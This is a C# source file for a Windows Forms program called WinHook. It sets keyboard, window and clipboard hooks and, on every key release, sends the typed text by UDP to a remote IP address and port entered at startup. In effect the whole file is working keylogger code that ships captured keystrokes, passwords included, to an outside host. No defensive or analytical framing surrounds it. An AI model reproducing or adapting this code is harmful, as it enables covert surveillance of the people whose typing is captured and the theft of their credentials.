using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static WinHook.Kernel32;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace WinHook
{
    public class WinHookContext : ApplicationContext
    {
        private KeyboardHook kbdHook = new KeyboardHook();
        private WindowsHook wndHook = new WindowsHook();
        private ClipboardHook clipHook = new ClipboardHook();
        private NamedEvent exitEvent = NamedEvent.Deafult;
        private DuplicateLaunch dlaunch = DuplicateLaunch.Default;
        public WinHookContext()
        {
            ConnectionInfo ipinput = new ConnectionInfo();
            ipinput.ShowDialog();
            remoteIp = IPAddress.Parse(ipinput.ipBox.Text);
            remotePort = int.Parse(ipinput.portBox.Text);
            Thread exitAppWatchDog = new Thread(ExitAppEventHandler);
            kbdHook.KeyUp += KbdHookOnKeyUp;
            exitAppWatchDog.Start();
        }
        public IPAddress remoteIp;
        public int remotePort;
        private void ExitAppEventHandler()
        {
            exitEvent.Wait();
            exitEvent.Reset();
            Application.Exit();
        }
        private async void KbdHookOnKeyUp(object sender, LowLevelKeyboardEventArgs eventargs)
        {
            if (sender is KeyboardHook && eventargs.Text.Length > 0)
            {
                Socket senderSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP);
                IPAddress broadcastIP = remoteIp;
                EndPoint listenerEP = new IPEndPoint(broadcastIP, remotePort);
                byte[] buff = Encoding.Default.GetBytes(eventargs.Text);
                try
                {
                    await senderSocket.SendToAsync(new ArraySegment<byte>(buff), SocketFlags.None, listenerEP);
                }
                catch
                {
                    MessageBox.Show("The connection wasn't established.\nForced stop of the program!", "Connection error");
                    System.Environment.Exit(0);
                }
                finally
                {
                    senderSocket.Close();
                }
            }
        }
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                wndHook.Dispose();
                kbdHook.Dispose();
                clipHook.Dispose();
                exitEvent.Reset();
                dlaunch.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}